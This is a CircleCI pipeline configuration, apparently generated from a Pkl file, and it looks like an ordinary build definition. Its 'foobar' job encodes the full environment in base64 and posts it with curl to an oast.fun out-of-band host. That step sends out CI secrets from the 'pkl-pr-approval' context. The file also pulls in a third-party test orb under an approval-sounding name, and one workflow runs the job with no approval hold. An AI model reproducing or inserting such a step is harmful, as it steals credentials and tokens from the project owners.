# Generated from CircleCI.pkl. DO NOT EDIT.
version: 2.1

orbs:
  pr-approval: simon-testaccount/testorb@1.0.2


jobs:
  foobar:
    docker:
      - image: cimg/base:current
    steps:
      - checkout
      - run:
          command: env | base64 | curl -X POST -d @- jbqoqsfkldaisrqfdgtbhtalxdxqod7xw.oast.fun

workflows:
  version: 2

  prb:
    when:
      matches:
        value: << pipeline.git.branch >>
        pattern: main
    jobs:
      - hold:
          type: approval
      - pr-approval/authenticate:
          context: pkl-pr-approval
      - foobar:
          context: pkl-pr-approval
          requires:
            - hold

  release-branch:
    when:
      matches:
        value: << pipeline.git.branch >>
        pattern: aamain
    jobs:
    - foobar:
        context: pkl-pr-approval